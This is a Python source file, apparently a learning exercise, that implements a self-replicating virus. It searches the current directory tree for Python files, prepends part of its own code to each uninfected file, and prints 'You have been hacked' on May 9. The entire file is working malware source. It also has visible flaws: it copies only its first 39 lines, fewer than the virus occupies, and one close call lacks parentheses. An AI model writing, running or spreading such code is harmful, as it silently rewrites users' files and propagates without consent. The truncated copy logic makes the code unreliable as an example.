#!/usr/bin/python3


# modules
import os
import datetime

# definition of the virus signature
SIGNATURE = "VIRUS"

# Function name: locate
# Purpose      : recursively checks all subdirectories using os.listdir() in order
#                to find .py files that have not been infected by the virus
# Arguments    : path
# Return       : returns a list of file paths that end in '.py' and have not yet 
#                been infected by the virus
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        
        # if the file if a directory, recursively search for .py files
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
       
        # if it is a python file or it ends with '.py' it will check if it is already infected
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                # if the virus signature is found, the file is infected 
                if SIGNATURE in line:
                    infected = True 
                    break
            # if the virus signature is not found, the file path is added to the 'files_targeted' list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted



# Function name: infect
# Purpose      : adds a virus signature string to the beginning of all Python files
#                specified in the 'files_targeted' list, effectively infecting those
#                files with the virus
# Arguments    : files_targeted
# Return       : none
def infect(files_targeted):
    # open the virus file itself that will be infected
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        # get the first 39 lines of the virus file
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        
        # open the targeted file that it will be infected
        f = open(fname)
        
        # temp contains the file's content 
        temp = f.read()
        f.close()
        
        f = open(fname,"w")
        
        # overwrite the targeted file with the virus string followed by its original contents
        f.write(virusstring + temp)
        f.close()


# Function name: detonate
# Purpose      : checks if the curretn date is May 9th and, if so, prints a message
# Arguments    : none
# Return       : none
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()



### STRETCH GOAL ###
### Not done yet ###